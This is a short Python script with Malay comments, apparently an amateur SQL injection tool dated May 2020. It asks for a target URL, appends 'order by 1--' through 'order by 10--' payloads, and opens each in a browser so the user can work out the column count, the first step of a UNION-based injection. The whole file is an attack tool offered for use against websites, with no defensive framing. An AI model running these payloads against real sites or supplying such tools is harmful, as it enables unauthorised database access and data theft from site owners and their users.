# Skrip UlarSawa3 Suntikan SQL (SQLi) | # Tanya alamat laman web dam menjalankan injeksi / suntikan SQL keatas nya.
# Written by Lina M / ditulis oleh Lina M. | Mei 2020

import random
import string
import webbrowser

print ("Selamat menggunakan Skrip UlarSawa3 Suntikan SQL (SQLi) kami.")
print ("LANGKAH: 1")
print ("Masukkan alamat sasaran secara penuh, contoh www.sasaran.com/index.php?=1")
url0 = input("[+] Alamat sasaran: ")
    
union1 = str(1)
union2 = str(2)
union3 = str(3)
union4 = str(4)
union5 = str(5)
union6 = str(6)
union7 = str(7)
union8 = str(8)
union9 = str(9)
union10 = str(10)
    
url1 = (url0) + ' ' + 'order by '+ union1 + '--' 
url2 = (url0) + ' ' + 'order by '+ union2 + '--'
url3 = (url0) + ' ' + 'order by '+ union3 + '--'
url4 = (url0) + ' ' + 'order by '+ union4 + '--'
url5 = (url0) + ' ' + 'order by '+ union5 + '--'
url6 = (url0) + ' ' + 'order by '+ union6 + '--'
url7 = (url0) + ' ' + 'order by '+ union7 + '--' 
url8 = (url0) + ' ' + 'order by '+ union8 + '--'
url9 = (url0) + ' ' + 'order by '+ union9 + '--'
url10 = (url0) + ' ' + 'order by '+ union10 + '--'

print (url0)
print (url1)
print (url2)
print (url3)
print (url4)
print (url5)
print (url6)
print (url7)
print (url8)
print (url9)
print (url10)

print ("Browser akan dibuka sekarang. Kenalpasti web page mana yang mempunyai mesej ralat X.")
print ("Bilangan tiang atau column adalah -1 daripada X atau tiang iaitu X - 1.")

webbrowser.open_new(url1)
webbrowser.open_new(url2)
webbrowser.open_new(url3)
webbrowser.open_new(url4)
webbrowser.open_new(url5)
webbrowser.open_new(url6)
webbrowser.open_new(url7)
webbrowser.open_new(url7)
webbrowser.open_new(url8)
webbrowser.open_new(url9)
webbrowser.open_new(url10)
